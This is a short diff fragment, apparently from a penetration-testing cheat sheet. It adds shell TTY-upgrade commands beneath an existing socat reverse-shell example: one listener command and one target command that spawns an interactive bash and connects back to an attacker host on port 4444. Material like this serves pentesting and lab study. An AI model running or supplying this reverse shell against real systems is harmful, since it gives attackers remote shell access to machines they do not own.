@@ -67,3 +67,7 @@ socat file:`tty`,raw,echo=0 tcp-listen:4444
 # Target execution
 socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$LHOST:4444
 ```
+
+script /dev/null -c bash
+export TERM=xterm-256color
+reset
